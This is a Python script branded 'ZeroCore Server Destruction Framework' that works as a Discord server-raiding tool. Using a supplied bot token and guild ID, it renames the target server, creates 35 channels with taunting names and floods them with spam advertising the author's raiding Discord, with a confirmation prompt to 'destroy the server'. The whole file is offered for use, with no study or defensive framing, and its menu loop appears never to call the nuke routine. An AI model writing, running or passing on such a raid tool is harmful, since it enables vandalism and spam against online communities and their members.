import discord
from discord.ext import commands
import asyncio
import os
import time
import random

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# ====================== WYŚWIETLANIE ZDJĘCIA ======================
def show_pls_star():
    if not PIL_AVAILABLE:
        print("[-] Pillow not installed. Skipping image.")
        time.sleep(1.5)
        return

    try:
        img = Image.open("pls star.png")   # zmień nazwę jeśli plik ma inną nazwę
        img.show()
        print("[+] Opened 'pls star.png'")
        time.sleep(3)   # ile sekund ma być otwarte zdjęcie
    except FileNotFoundError:
        print("[-] File 'pls star.png' not found in this folder!")
        time.sleep(2)
    except Exception as e:
        print(f"[-] Error opening image: {e}")
        time.sleep(2)

# ====================== MATRIX INTRO ======================
def matrix_intro():
    clear()
    print("\033[92m")  

    for _ in range(20):
        line = ''.join(random.choice(['0','1']) for _ in range(78))
        print(line)
        time.sleep(0.07)

    clear()
    print("\033[91m")
    print(r"""
    ███████╗███████╗██████╗  ██████╗  ██████╗ ██████╗ ███████╗
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝
      ███╔╝ █████╗  ██████╔╝██║   ██║██║     ██║   ██║█████╗  
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██╔══╝  
    ███████╗███████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝███████╗
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝
    """)
    print("\033[0m")
    print("                  ZERO CORE".center(70))
    print("             SERVER DESTRUCTION FRAMEWORK".center(70))
    print("="*80)
    time.sleep(1.3)

# ====================== MENU ======================
def main_menu():
    clear()
    print("\033[91m")
    print(r"""
    ███████╗███████╗██████╗  ██████╗  ██████╗ ██████╗ ███████╗
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝
      ███╔╝ █████╗  ██████╔╝██║   ██║██║     ██║   ██║█████╗  
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██╔══╝  
    ███████╗███████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝███████╗
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝
    """)
    print("\033[0m")
    print("                  ZERO CORE MULTI TOOL".center(70))
    print("="*80)
    print()
    print("   1. Discord Server Nuker")
    print("   2. Exit")
    print()
    choice = input("   Select option > ").strip()
    return choice

# ====================== NUKE ======================
async def start_nuke(bot):
    clear()
    print("\033[91m")
    print("                  [ DISCORD SERVER NUKE MODULE ]")
    print("="*80)
    print("\033[0m")

    guild_id = int(input("   Server Guild ID: "))
    guild = bot.get_guild(guild_id)

    if not guild:
        print("   [-] Bot is not on this server!")
        input("   Press Enter...")
        return

    print(f"   [+] Target locked: {guild.name}")

    confirm = input("\n   Type 'START' to destroy the server: ").strip().upper()

    if confirm != "START":
        print("   [-] Operation aborted.")
        input("   Press Enter...")
        return

    print("\n\033[91m   [!!!] FULL DESTRUCTION SEQUENCE INITIATED [!!!]\033[0m\n")

    spam_messages = [
        "Wanna destroy servers? Join our discord server https://discord.gg/rbv6XGdsEw",
        "https://discord.gg/rbv6XGdsEw",
        "That was so easy noobies"
    ]

    try:
        await guild.edit(name="Z̵e̷r̶o̴c̴o̸r̴e̷")
        print("[+] Server name changed")
    except:
        print("[-] Failed to change server name")

    channel_names = [
        "Z̵e̷r̶o̴c̴o̸r̴e̷",
        "🤡U̷s̸e̸A̴n̷t̸i̸R̵a̴i̷d̵D̶u̶m̴m̷y̷s̴",
        "T̴o̵o̷ ̷s̵l̵o̷w̷ ̸n̸w̶o̴r̷d̸s̵ 🤡"
    ]

    for i in range(35):
        try:
            ch = await guild.create_text_channel(channel_names[i % 3])
            print(f"  [+] Created: {ch.name}")

            for _ in range(3):
                for msg in spam_messages:
                    try:
                        await ch.send(msg)
                    except:
                        pass
                    await asyncio.sleep(0.2)
        except:
            pass
        await asyncio.sleep(0.5)

    print("\n\033[91m   [+] DESTRUCTION SEQUENCE COMPLETED [+]\033[0m")
    input("\n   Press Enter to return to menu...")

# ====================== MAIN ======================
async def main():
    show_pls_star()
    matrix_intro()

    while True:
        choice = main_menu()

        if choice == "1":
            token = input("\n   Enter Bot Token: ").strip()
            intents = discord.Intents.default()
            intents.message_content = True
            intents.guilds = True
            bot = commands.Bot(command_prefix="!", intents=intents)
            await bot.start(token)
        elif choice == "2":
            print("   Exiting ZeroCore...")
            break

if __name__ == "__main__":
    asyncio.run(main())